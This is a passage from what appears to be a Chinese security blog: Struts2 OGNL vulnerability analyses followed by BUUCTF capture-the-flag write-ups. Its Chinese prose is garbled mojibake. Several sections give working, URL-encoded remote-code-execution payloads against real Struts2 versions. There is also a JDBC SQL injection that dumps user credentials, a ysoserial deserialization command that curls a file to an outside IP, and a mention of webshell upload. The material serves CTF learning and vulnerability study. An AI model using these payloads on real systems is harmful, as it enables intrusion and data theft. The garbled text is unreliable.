å…¥å‚æ•°çš„å€¼åœ¨138è¡Œäº¤ç»™äº†cmdï¼Œåˆåœ¨145è¡Œé€šè¿‡`stack.findValue`æ‰§è¡Œäº†OGNLè¡¨è¾¾å¼å¹¶å°†å›æ˜¾å†…å®¹å†™å…¥é¡µé¢![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100101557.png)\n\næ¼æ´ä¿®å¤ï¼šåœ¨ä¹‹åçš„ç‰ˆæœ¬ä¸­ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥é˜²æ­¢å†…å®¹æ‰§è¡Œ\n\nPayloadï¼š\n\n```\n?debug=command&expression=%28%23_memberAccess%5B\"allowStaticMethodAccess\"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28\"false\"%29%20%2C%23context%5B\"xwork.MethodAccessor.denyMethodExecution\"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29\n```\n\n## 283\n\næ¼æ´ï¼šS2-009 *CVE-2011-3923*\n\næ¼æ´æˆå› ï¼šStruts2æ¡†æ¶ä¸­ParametersInterceptoræ‹¦æˆªå™¨åªæ£€æŸ¥ä¼ å…¥çš„å‚æ•°åæ˜¯å¦åˆæ³•,ä¸ä¼šæ£€æŸ¥å‚æ•°å€¼ï¼Œä¾‹å¦‚ä¼ å…¥å‚æ•°`top['foo'](0)`ä¼šé€šè¿‡ParametersInterceptorçš„ç™½åå•æ£€æŸ¥,OGNLä¼šå°†å…¶è§£æä¸º(top[â€˜fooâ€™])(0),å¹¶å°†fooçš„å€¼ä¹Ÿä½œä¸ºOGNLè¡¨è¾¾å¼è¿›è¡Œè®¡ç®—ä»è€Œé€ æˆä»£ç æ‰§è¡Œ\n\nå…¶å®è¿™ä¸ªæ¼æ´æ˜¯å¯¹S2-003å’ŒS2-005æ¼æ´çš„ç»•è¿‡.S2-003çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢#å·ï¼Œäºæ˜¯S2-005é€šè¿‡ä½¿ç”¨#å·çš„unicodeç¼–ç \\u0023æˆ–8è¿›åˆ¶ç¼–ç \\43æ¥ç»•è¿‡ï¼ŒStruts2å¯¹S2-005çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢\\ç­‰ç‰¹æ®Šç¬¦å·ï¼Œè¿™æ¬¡æ˜¯é€šè¿‡Struts2æ¡†æ¶ä¸­ParametersInterceptoræ‹¦æˆªå™¨åªæ£€æŸ¥ä¼ å…¥çš„å‚æ•°åè€Œä¸æ£€æŸ¥å‚æ•°å€¼çš„æ–¹å¼è¿›è¡Œæ„é€ OGNLè¡¨è¾¾å¼ä»è€Œé€ æˆä»£ç æ‰§è¡Œ\n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.1\n\næ¼æ´åˆ†æï¼š\n\n1. æµç¨‹ä¸S2-005åŸºæœ¬ç›¸åŒï¼Œè·³è¿‡åˆ†æï¼Œç›´æ¥åˆ†æpayload\n2. å½“æœ‰å½¢ä¼¼(one)(two)çš„å˜é‡æ—¶ï¼Œoneä¼šè¢«å½“ä½œä¸€ä¸ªOGNLè¡¨è¾¾å¼å»è®¡ç®—ï¼Œç„¶åæŠŠå®ƒçš„ç»“æœå½“ä½œå¦ä¸€ä¸ªä»¥twoä¸ºæ ¹å¯¹è±¡çš„OGNLè¡¨è¾¾å¼å†ä¸€æ¬¡è®¡ç®—ï¼Œæ‰€ä»¥ï¼Œå¦‚æœoneæœ‰è¿”å›å†…å®¹ï¼Œé‚£ä¹ˆè¿™äº›å†…å®¹å°†ä¼šè¢«å½“ä½œOGNLè¯­å¥è¢«è®¡ç®—ï¼Œè€Œpayloadç»“å°¾ä¼ å…¥çš„`z[(name)(%27meh%27)]`å°±æ˜¯ä¸ºäº†æŠŠnameå‚æ•°çš„å€¼å½“ä½œOGNLè¡¨è¾¾å¼è®¡ç®—\n\npayloadï¼š\n\n```java\n?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)] \n```\n\n## 284\n\næ¼æ´ï¼šS2-012 *CVE-2013-1965*\n\næ¼æ´æˆå› ï¼šåœ¨Struts2æ¡†æ¶ä¸­ï¼Œå¦‚æœé…ç½®Actionä¸­çš„Resultæ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨${param_name}ä½œä¸ºé‡å®šå‘å˜é‡ï¼Œå½“è§¦å‘redirectç±»å‹è¿”å›æ—¶ï¼ŒStruts2ä½¿ç”¨${param_name}è·å–å…¶å€¼ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå¯¹nameå‚æ•°çš„å€¼æ‰§è¡ŒOGNLè¡¨è¾¾å¼è§£æ,ä»è€Œå¯ä»¥æ’å…¥ä»»æ„OGNLè¡¨è¾¾å¼å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ\n\nå½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.14.2\n\næ¼æ´åˆ†æï¼š\n\n1. é¦–å…ˆè¿˜æ˜¯æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­ä½¿ç”¨äº†redirectæ–¹æ³•å¹¶ä¸”è¿”å›å€¼ä¸­ä½¿ç”¨äº†${name}å–å€¼ï¼Œå­˜åœ¨æ¼æ´è§¦å‘æ¡ä»¶![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142228174.png)\n\n2. åœ¨`com.opensymphony.xwork2.DefaultActionInvocation`ç±»ä¸­æ‰“æ–­ç‚¹![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142230130.png)\n\n3. æ­¥å…¥æ–¹æ³•ï¼ŒcreateResultæ–¹æ³•ä¼šæ ¹æ®actionçš„è¿”å›å€¼è·å–å¯¹åº”çš„resultæ ‡ç­¾é…ç½®ï¼Œç„¶åä¼ å…¥åˆ°buildResultæ–¹æ³•ä¸­ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯ç”Ÿæˆå¯¹åº”çš„Resultå®ç°ç±»ï¼Œä¹Ÿå°±æ˜¯`org.apache.struts2.dispatcher.ServletRedirectResult`ç±»ï¼Œå¹¶æŠŠå¯¹åº” resultæ ‡ç­¾çš„å€¼/index.jsp?name=${name}è®¾ç½®ç»™ServletRedirectResult ç±»çš„locationå±æ€§ï¼Œç„¶åè¿”å›ServletRedirectResult![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322880.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322785.png)\n\n4. ç„¶åè¿”å›åˆ°executeResultæ–¹æ³•ä¸­ç»§ç»­æ‰§è¡Œï¼Œè¿›å…¥åˆ°`this.result.execute`ä¸­ï¼ŒæŸ¥çœ‹resultå°±æ˜¯ServletRedirectResultç±»å‹ï¼Œæ­¥å…¥å‘ç°å…¶æ‰§è¡Œäº†superçš„executeæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥conditionalParseæ–¹æ³•ï¼Œå‘ç°å…¶æ‰§è¡Œäº†S2-001ä¸­åŒåå…³é”®æ–¹æ³•translateVariablesï¼Œå¹¶ä¸”é€šè¿‡é‡è½½èƒ½çœ‹åˆ°é™åˆ¶äº†å¾ªç¯æ¬¡æ•°æœ€é«˜ä¸º1ï¼Œè¿™å°±æ˜¯å¯¹S2-001çš„æ¼æ´ä¿®å¤![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142328950.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142334539.png)\n\n5. > å¯¹äºS2-001æ¼æ´,å®˜æ–¹è®¾ç½®äº†å¾ªç¯æ¬¡æ•°,ä»è€Œé™åˆ¶æ¶æ„ä»£ç ,ä½†è¿™ä¸ªè®¾ç½®çš„å¾ªç¯æ¬¡æ•°æ˜¯é’ˆå¯¹çš„whileå¾ªç¯,åœ¨å¤–é¢è¿˜æœ‰ä¸€ä¸ªforå¾ªç¯,forå¾ªç¯å¼€å§‹çš„poså‚æ•°ç”¨æ¥è·å–expressionè¡¨è¾¾å¼çš„å¼€å§‹ä½ç½®,æ¯”å¦‚è§£æå®Œäº†%{password}çš„å€¼,ä¸‹ä¸€æ¬¡è§£ææ˜¯ä»%{password}åé¢å¼€å§‹.åœ¨S2-001çš„ä¿®å¤ä¸­å®ƒè¢«æ”¾åœ¨äº†forå¾ªç¯é‡Œ,å¯¼è‡´ç¬¬äºŒæ¬¡forå¾ªç¯æ—¶posçš„å€¼ä¼šè¢«é‡ç½®ä¸º0.ä»è€Œåˆä»å¤´å¼€å§‹è§£æ.ä»ä¸‹å›¾ä¸­çš„å˜é‡å€¼å¯ä»¥çœ‹åˆ°forè¿›è¡Œäº†2æ¬¡å¾ªç¯,å¾ªç¯2æ¬¡æ˜¯å› ä¸ºä¼ å…¥çš„å‚æ•°new char[]{â€˜$â€™, â€˜%â€™}é•¿åº¦ä¸º2å¯¼è‡´çš„.forç¬¬äºŒæ¬¡å¾ªç¯æ—¶openä¸ºarræ•°ç»„çš„ç¬¬äºŒä¸ªå‚æ•°%,è¿™ä¸ª%å’Œ{ç»„åˆååˆæˆäº†S2-001çš„åˆ©ç”¨æ‰€éœ€è¦çš„æ¡ä»¶,æœ€åè¿˜æ˜¯é€šè¿‡whileå¾ªç¯ä¸­çš„stack.findValueæ¥è¿›è¡Œæ‰§è¡Œä»£ç çš„.S2-001ä¿®å¤æ–¹æ¡ˆä¸­çš„å¢åŠ loopCountå˜é‡é™åˆ¶äº†whileå¾ªç¯çš„æ¬¡æ•°,å´æ²¡æœ‰é™åˆ¶forå¾ªç¯çš„æ¬¡æ•°,æ¯æ¬¡forå¾ªç¯å¼€å§‹æ—¶loopCountéƒ½ä¼šè¢«é‡ç½®ä¸º1.\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142337790.png)\n\npayloadï¼š\n\n```\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n```\n\n## 285\n\næ¼æ´ï¼šS2-013 *CVE-2013-1966*\n\næ¼æ´æˆå› ï¼šåœ¨Struts2æ ‡ç­¾ä¸­å’Œéƒ½åŒ…å«ä¸€ä¸ªincludeParamså±æ€§ï¼Œå…¶å€¼å¯è®¾ç½®ä¸ºnoneã€get æˆ– allï¼Œå…¶å¯¹åº”æ„ä¹‰åˆ†åˆ«ä¸ºï¼šnone:é“¾æ¥ä¸åŒ…å«è¯·æ±‚çš„ä»»æ„å‚æ•°å€¼(é»˜è®¤)ï¼Œget:é“¾æ¥åªåŒ…å«GETè¯·æ±‚ä¸­çš„å‚æ•°å’Œå…¶å€¼ï¼Œall:é“¾æ¥åŒ…å«GETå’ŒPOSTæ‰€æœ‰å‚æ•°å’Œå…¶å€¼ï¼Œç”¨æ¥æ˜¾ç¤ºä¸€ä¸ªè¶…é“¾æ¥,å½“includeParams=allçš„æ—¶å€™ï¼Œä¼šå°†æœ¬æ¬¡è¯·æ±‚çš„GETå’ŒPOSTå‚æ•°éƒ½æ”¾åœ¨URLçš„GETå‚æ•°ä¸Šï¼Œè¿™ä¸ªå‚æ•°ä¼šè¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æï¼Œä»è€Œå¯ä»¥æ’å…¥ä»»æ„OGNLè¡¨è¾¾å¼å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ\n\nå½±å“ç‰ˆæœ¬ï¼š*Struts 2.0.0 - Struts 2.3.14.1*\n\næ¼æ´åˆ†æï¼š\n\n1. çœ‹é…ç½®æ–‡ä»¶ï¼ŒincludeParamså±æ€§ä¸ºall![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150147876.png)\n2. `org.apache.struts2.components.ComponentUrlProvider`æ‰“æ–­ç‚¹![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150209394.png)\n3. è·Ÿå…¥beforeRenderUrlå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è·å–äº†urlæ‰€ä¼ é€’çš„å‚æ•°å¯ä»¥çœ‹åˆ°includeParamså‚æ•°ä¸ºallï¼Œæ­¤å¤„çš„mergeRequestParametersè·å–åˆ°äº†urlä¸­ä¼ é€’çš„å‚æ•°![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209151820358.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161613470.png)\n4. æ­¥è¿‡æ‰§è¡Œç›´åˆ°endå‡½æ•°ï¼Œç»§ç»­æ­¥å…¥renderUrlå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬èƒ½çœ‹åˆ°æˆ‘ä»¬çš„payloadå·²ç»è¢«æ”¾å…¥åˆ°äº†urlComponentçš„paramterså±æ€§ä¸­ï¼Œç»§ç»­è·Ÿå…¥determineActionURLå‡½æ•°![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161706306.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161709860.png)\n5. è¿›å…¥åˆ°é‡è½½å‡½æ•°determineActionURLï¼Œæ‰§è¡Œåˆ°æœ€åå‘ç°æˆ‘ä»¬payloadå‰åŠæ®µå·²ç»è¢«è¢«æ‰§è¡Œï¼ŒactionMapperä¸­çš„allowDynamicMethodCallså±æ€§å·²ç»å˜ä¸ºtrueï¼Œç»§ç»­è·Ÿå…¥buildUrlæ–¹æ³•![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161712049.png)\n6. æ­¥è¿‡åˆ°buildParametersStringï¼Œæ­¥å…¥è¯¥å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„urlå’Œå‚æ•°è¢«ä¼ å…¥å…¶ä¸­![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161714673.png)\n7. è¿›å…¥åˆ°é‡è½½æ–¹æ³•ä¸­ï¼Œæ‰§è¡Œç›´åˆ°166è¡ŒbuildParameterSubstringå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„payloadå·²ç»è¢«ä¼ å…¥å…¶ä¸­![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161717072.png)\n8. ç»§ç»­è·Ÿå…¥translateAndEncodeå‡½æ•°ï¼Œè·Ÿå…¥translateVariableå‡½æ•°ï¼Œå¯ä»¥å‘ç°valueStackå‡ºç°äº†![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161718405.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161719376.png)\n9. ç»§ç»­è·Ÿå…¥å°±æ˜¯translateVariableså‡½æ•°äº†ï¼ŒOGNLè¡¨è¾¾å¼åœ¨è¿™é‡Œè¢«æ‰§è¡Œ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161720361.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\npayloadï¼š\n\n```\n?a=%24%7B%23_memberAccess%5B\"allowStaticMethodAccess\"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D \n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"BUUCTFè®°å½•3","url":"/posts/560a0a51.html","content":"\nBUUç¬¬ä¸‰ä»½\n\n<!--more -->\n\n## [æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp2-Myblog\n\næ˜æ˜¾çš„æ–‡ä»¶è¯»å–ï¼Œloginä¸­èƒ½çœ‹åˆ°ç™»å½•å¯†ç ç”Ÿæˆé€»è¾‘ï¼Œå®Œå…¨éšæœºï¼Œæ²¡æ³•ç›´æ¥æ‹¿åˆ°\n\n```php\n<?php\n$secret_seed = mt_rand();\nmt_srand($secret_seed);\n$_SESSION['password'] = mt_rand();\nprint($_SESSION['password']);\n?>\n```\n\nçœ‹ç™»å½•é€»è¾‘\n\n```php\n<?php\nerror_reporting(0);\nsession_start();\n$logined = false;\nif (isset($_POST['username']) and isset($_POST['password'])){\n    if ($_POST['username'] === \"Longlone\" and $_POST['password'] == $_SESSION['password']){  // No one knows my password, including myself\n        $logined = true;\n        $_SESSION['status'] = $logined;\n    }\n}\nif ($logined === false && !isset($_SESSION['status']) || $_SESSION['status'] !== true){\n    echo \"<script>alert('username or password not correct!');window.location.href='index.php?page=login';</script>\";\n    die();\n}\n?>\n  <?php\n  if(isset($_FILES['Files']) and $_SESSION['status'] === true){\n    $tmp_file = $_FILES['Files']['name'];\n    $tmp_path = $_FILES['Files']['tmp_name'];\n    if(($extension = pathinfo($tmp_file)['extension']) != \"\"){\n      $allows = array('gif','jpeg','jpg','png');\n      if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){\n        $upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;\n        move_uploaded_file($tmp_path,\"assets/img/upload/\".$upload_name);\n        echo \"<script>alert('Update image -> assets/img/upload/${upload_name}') </script>\";\n      } else {\n        echo \"<script>alert('Update illegal! Only allows like \\'gif\\', \\'jpeg\\', \\'jpg\\', \\'png\\' ') </script>\";\n      }\n    }\n  }\n?>\n```\n\nå¯ä»¥çœ‹åˆ°å¯†ç éªŒè¯ä¸­æœ‰ä¸€ä¸ªå¼±æ¯”è¾ƒï¼Œä¼ å…¥passwordä¸ºç©ºç›´æ¥ç»•è¿‡ï¼Œç„¶åå°±æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œé€»è¾‘å°±æ˜¯åªèƒ½ä¼ å›¾ç‰‡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶æ–‡ä»¶å†…å®¹ï¼Œé‚£pharæˆ–è€…zipå§å†…å®¹æ‰“åŒ…éƒ½å¯ä»¥ï¼ˆå› ä¸ºè§¦å‘è¿˜éœ€è¦indexä¸­çš„include xxx.phpï¼Œæ‰€ä»¥æ–‡ä»¶åªèƒ½ä»¥phpç»“å°¾ï¼‰ï¼Œè®°å¾—æ‹¦æˆªåŒ…ä¿®æ”¹ä¸€ä¸‹usernameå’Œpasswordå‚æ•°ï¼Œä¸ç„¶ç›´æ¥é€€å‡ºäº†\n\n```\nflag{fa7bcb65-99a0-4643-93c2-93cacaaf442c}\n```\n\n## [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java\n\nå˜¿å˜¿åšçš„ç¬¬ä¸€é“Javaé¢˜ï¼Œè®°å½•ä¸€ä¸‹Javaåº”è¯¥æ€ä¹ˆå…¥æ‰‹ï¼Œé¦–å…ˆç›®å½•æ‰«æï¼Œæ‰«å‡ºäº†`swagger-ui.html`ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªwebé¡µé¢ä½¿ç”¨çš„æ‰€æœ‰API![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837086.png)\n\n\n\n\n\n\n\n\n\nçœ‹ä»£ç æ˜¯`/common/test/sqlDict`è¿™ä¸€è·¯å¾„çš„è°ƒç”¨ï¼Œå…¶ä¸­dbNameæ˜¯æˆ‘ä»¬ä¼ å‚å†…å®¹ï¼Œè·Ÿè¿›å…¶ä¸­çš„SqlDict.getTableDataï¼ŒæŸ¥çœ‹getConnectionæ–¹æ³•ï¼Œå…¶ä¸­æœ¬è´¨æ˜¯é€šè¿‡jdbcæ¥å£è¿›è¡Œæ•°æ®åº“è¿æ¥ï¼Œè€Œjdbcåœ¨è§£ææ•°æ®åº“æ—¶ç±»ä¼¼äºå¯¹URLçš„è§£æ\n\n> JDBC çš„ URL ä¹Ÿç±»ä¼¼ http è¯·æ±‚ä¸­çš„ URLï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é”šç‚¹ # æˆ–è€… ? å¦‚ï¼šjdbc:mysql://mysqldbserver:3306/myapp#' union select 2#\n>\n\nä¹Ÿå°±æ˜¯#åé¢çš„å†…å®¹ä¼šè¢«å¿½ç•¥ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†ä¿¡æ¯ä¾ç„¶ä¼šè¢«ä¼ é€’åˆ°dbNameå‚æ•°ä¸­è¿›è¡Œæ¥ä¸‹æ¥çš„æŸ¥è¯¢\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837304.png)\n\né‚£æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ„é€ å‡ºsqlæ³¨å…¥çš„è¯­å¥\n\n```\ndbName=myapp#' union select group_concat(name,0x3a,pwd)from user#\næ„é€ å‡ºçš„è¯­å¥\nSelect TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = 'myapp#' union select group_concat(name,0x3a,pwd)from user#åé¢çš„ä¸é‡è¦\n```\n\næ‹¿åˆ°ç”¨æˆ·åå’Œå¯†ç `admin:admin@Rrrr_ctf_asde`\n\nç™»å½•æˆåŠŸæ‹¿åˆ°tokenï¼Œå‘ç°æ˜¯Javaåºåˆ—åŒ–åå†…å®¹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081917768.png)\n\nå¹¶ä¸”å°†å†…å®¹æäº¤åˆ°currentAPIä¸­æ—¶ï¼Œä¹Ÿä¼šè¿”å›ç”¨æˆ·ä¿¡æ¯ï¼Œysoæ„é€ åºåˆ—åŒ–æ”»å‡»å³å¯\n\n```shell\n/Users/jlan/Library/Java/JavaVirtualMachines/azul-1.8.0_332/Contents/Home/bin/java -jar /Users/jlan/Documents/Tools/ysoserial-all.jar ROME \"curl http://182.61.46.138:1000 -d @/flag\" |base64\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081932780.png)\n\n## [GKCTF 2021]babycat\n\nå¿«ä¹javaé¢˜ï¼Œé¶æœºå¯åŠ¨çœŸçš„å¥½æ…¢ï¼Œä¸Šæ¥å°±æ˜¯ä¸€ä¸ªntç™»å½•ç•Œé¢ï¼Œç™»å½•ä¸è¡Œï¼Œæ³¨å†Œæœªå¼€æ”¾![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131744693.png)\n\nä½†æ˜¯ç‚¹å‡»æ³¨å†ŒæŸ¥çœ‹æºä»£ç å‘ç°æ˜¯æ³¨å†Œé€»è¾‘è¢«æ³¨é‡Šï¼ŒæŒ‰ç…§æ³¨é‡Šçš„é€»è¾‘æ„é€ payloadæ³¨å†Œï¼ŒæˆåŠŸæ³¨å†Œå¹¶ç™»å½•![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131745556.png)\n\nè¿›å…¥ä¸»é¡µå‘ç”µæ–‡ä»¶ä¸Šä¼ éœ€è¦adminæƒé™ï¼Œå¹¶ä¸”åœ¨downloadå­˜åœ¨æ–‡ä»¶æ³„éœ²ï¼Œå…ˆçœ‹web.xmlå†…å®¹ï¼Œæ ¹æ®å†…å®¹å°†classæ–‡ä»¶ä¾æ¬¡ä¸‹è½½ï¼Œä¸‹é¢æˆ‘ä»¬ä¸»è¦æŸ¥çœ‹uploadServletå’ŒregisterServlet\n\n```xml-dtd\n<!DOCTYPE web-app PUBLIC\n \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n \"http://java.sun.com/dtd/web-app_2_3.dtd\" >\n\n<web-app>\n  <servlet>\n    <servlet-name>register</servlet-name>\n    <servlet-class>com.web.servlet.registerServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>login</servlet-name>\n    <servlet-class>com.web.servlet.loginServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>home</servlet-name>\n    <servlet-class>com.web.servlet.homeServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>upload</servlet-name>\n    <servlet-class>com.web.servlet.uploadServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>download</servlet-name>\n    <servlet-class>com.web.servlet.downloadServlet</servlet-class>\n  </servlet>\n  <servlet>\n    <servlet-name>logout</servlet-name>\n    <servlet-class>com.web.servlet.logoutServlet</servlet-class>\n  </servlet>\n  <servlet-mapping>\n    <servlet-name>logout</servlet-name>\n    <url-pattern>/logout</url-pattern>\n  </servlet-mapping>\n  <servlet-mapping>\n    <servlet-name>download</servlet-name>\n    <url-pattern>/home/download</url-pattern>\n  </servlet-mapping>\n  <servlet-mapping>\n    <servlet-name>register</servlet-name>\n    <url-pattern>/register</url-pattern>\n  </servlet-mapping>\n  <display-name>java</display-name>\n  <servlet-mapping>\n    <servlet-name>login</servlet-name>\n    <url-pattern>/login</url-pattern>\n  </servlet-mapping>\n  <servlet-mapping>\n    <servlet-name>home</servlet-name>\n    <url-pattern>/home</url-pattern>\n  </servlet-mapping>\n  <servlet-mapping>\n    <servlet-name>upload</servlet-name>\n    <url-pattern>/home/upload</url-pattern>\n  </servlet-mapping>\n\n  <filter>\n    <filter-name>loginFilter</filter-name>\n    <filter-class>com.web.filter.LoginFilter</filter-class>\n  </filter>\n  <filter-mapping>\n    <filter-name>loginFilter</filter-name>\n    <url-pattern>/home/*</url-pattern>\n  </filter-mapping>\n  <display-name>java</display-name>\n\n  <welcome-file-list>\n    <welcome-file>/WEB-INF/index.jsp</welcome-file>\n  </welcome-file-list>\n</web-app>\n\n```\n\né‚£æˆ‘ä»¬è¯¥å¦‚ä½•æˆä¸ºadminå‘¢ï¼Œç›´æ¥çœ‹æ³¨å†Œç±»ä¸­çš„å…³é”®ä»£ç \n\n```java\nif (!StringUtils.isNullOrEmpty(role)) {\n    var = var.replace(role, \"\\\"role\\\":\\\"guest\\\"\");\n    person = (Person)gson.fromJson(var, Person.class);\n} else {\n    person = (Person)gson.fromJson(var, Person.class);\n    person.setRole(\"guest\");\n}\n```\n\næ­¤å¤„å¯¹æˆ‘ä»¬ä¼ å…¥çš„dataæ³¨å†Œä¿¡æ¯è¿›è¡Œäº†å¤„ç†ï¼Œå°†roleçš„jsonå†…å®¹æ¢æˆäº†guestï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç›´æ¥æ›´æ”¹dataä¸­çš„roleå±æ€§æ˜¯è¡Œä¸é€šçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨unicodeå­—ç¬¦ç»•è¿‡ï¼Œå¹¶ä¸”åœ¨å±æ€§ä¸­å¤šæ·»åŠ ä¸€å±‚å†…å®¹ä½¿å…¶ä¸­åŒ…å«äº†roleå±æ€§æ¥ç¡®ä¿æˆ‘ä»¬èƒ½å¤Ÿè¿›å…¥ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ„é€ å‡ºçš„payloadå¦‚ä¸‹\n\n```\n\n```\n\næ³¨å†ŒæˆåŠŸå¹¶ä¸”æˆåŠŸè¿›å…¥æ–‡ä»¶ä¸Šä¼ ç•Œé¢![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131804530.png) \n\nä¼ ä¸€ä¸ªjspé©¬åˆ°staticç›®å½•ä¸‹è¿æ¥å³å¯\n\nä½†æ˜¯ä¼¼ä¹buuçš„è¿™ä¸ªç‰ˆæœ¬æ˜¯ä¿®å¤åçš„ï¼Œå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ²¡æ³•ä¼ ğŸï¼Œæˆ‘æœ‰ä»€ä¹ˆåŠæ³•ï¼ˆ\n\n## [HarekazeCTF2019]Sqlite Voting\n\næºç å…¨æ˜¯è¿‡æ»¤\n\n```php\n<?php\nerror_reporting(0);\n\nif (isset($_GET['source'])) {\n  show_source(__FILE__);\n  exit();\n}\n\nfunction is_valid($str) {\n  $banword = [\n    // dangerous chars\n    // \" % ' * + / < = > \\ _ ` ~ -\n    \"[\\\"%'*+\\\\/<=>\\\\\\\\_`~-]\",\n    // whitespace chars\n    '\\s',\n    // dangerous functions\n    'blob', 'load_extension', 'char', 'unicode',\n    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',\n    'in', 'limit', 'order', 'union', 'join'\n  ];\n  $regexp = '/' . implode('|', $banword) . '/i';\n  if (preg_match($regexp, $str)) {\n    return false;\n  }\n  return true;\n}\n\nheader(\"Content-Type: text/json; charset=utf-8\");\n\n// check user input\nif (!isset($_POST['id']) || empty($_POST['id'])) {\n  die(json_encode(['error' => 'You must specify vote id']));\n}\n$id = $_POST['id'];\nif (!is_valid($id)) {\n  die(json_encode(['error' => 'Vote id contains dangerous chars']));\n}\n\n// update 